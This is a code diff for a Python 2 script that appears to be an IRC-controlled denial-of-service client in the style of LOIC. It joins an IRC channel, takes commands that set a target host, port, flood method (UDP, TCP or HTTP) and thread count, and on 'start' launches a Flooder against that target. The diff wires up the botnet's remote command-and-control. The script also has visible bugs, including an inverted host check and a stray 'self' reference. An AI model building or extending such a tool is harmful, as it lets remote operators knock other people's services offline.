@@ -1,31 +1,34 @@
-import sys, socket, string, random, os
+import sys, socket, string, random, os, time
 from Events import *
 from IRC import * 
+from Flooder import *
 
 NEED_INFO = 0
 WAITING = 1
 START = 2
 
-UDP_METHOD
-TCP_METHOD
-HTTP_METHOD
+UDP_METHOD = 0
+TCP_METHOD = 1
+HTTP_METHOD = 2
 
 status = NEED_INFO
+flooder = None
+
+targetip = None
+targethost = None
+timeout = None
+subsite = None
+message = None
+port = None
+method = TCP_METHOD
+threads = 1
+wait = None
+random = None
+speed = None
+
 
 def lazerParseHook(event):
     print event.arg
-
-    targetip = None
-    targethost = None
-    timeout = None
-    subsite = None
-    message = None
-    port = None
-    method = TCP_METHOD
-    threads = 1
-    wait = None
-    random = None
-    speed = None
 
     s = []
     for x in event.arg:
@@ -34,7 +37,7 @@ def lazerParseHook(event):
             for y in t:
                 s.append(y)
         else:
-            if t[0] == "start" and STATUS = WAITING:
+            if t[0] == "start" and status == WAITING:
                 status = START
                 return
 
@@ -97,31 +100,68 @@ def lazerParseHook(event):
         status = WAITING
 
 def lazerStartHook(event):
-    if status = START:
+    print "FIRING MAH LAZ000000R!"
+    if status == START:
         if targetip == None or targethost == None or port == None:
             print "no target set"
             return
-        if
+
+        if timeout == None:
+            print "Missing required timeout"
+            return
+        if method == None:
+            print "Missing required method"
+            return
+        if threads == None:
+            print "Missing required thread amount"
+            return
+
+        host = None
+        if targetip == None:
+            host = targetip
+        else:
+            host = targethost
+
+        flooder = Flooder(host, port, timeout, method, threads, subsite, message, random, wait)
+
+irc = None
+def restartIRCHook(event):
+    global irc
+
+    irc.listenThread.join()
+    time.sleep(5)
+    irc.connect()
 
 def main(args):
-    print args
+    global irc
 
     listener = Listener(LAZER_RECV, lazerParseHook)
     getEventManager().addListener(listener)
     listener = Listener(START_LAZER, lazerStartHook)
     getEventManager().addListener(listener)
+    listener = Listener(IRC_RESTART, restartIRCHook)
+    getEventManager().addListener(listener)
 
-    irc = IRC(args[1], int(args[2]), args[3])
+    host = args[1]
+    port = int(args[2])
+    channel = args[3]
+    if channel[0] != '#':
+        channel = '#' + self.channel
+
+    getEventManager().start()
+
+    irc = IRC(host, port, channel)
 
     while 1:
         i = raw_input()
         if i == "quit" or i == "exit":
             irc.stop()
+            getEventManager().stop()
             break
+
+    time.sleep(1)
+    sys.exit()
 
 
 if __name__ == '__main__':
-    args = []
-    for arg in sys.argv:
-        args.append(arg)
-    main(args)
+    main(sys.argv)
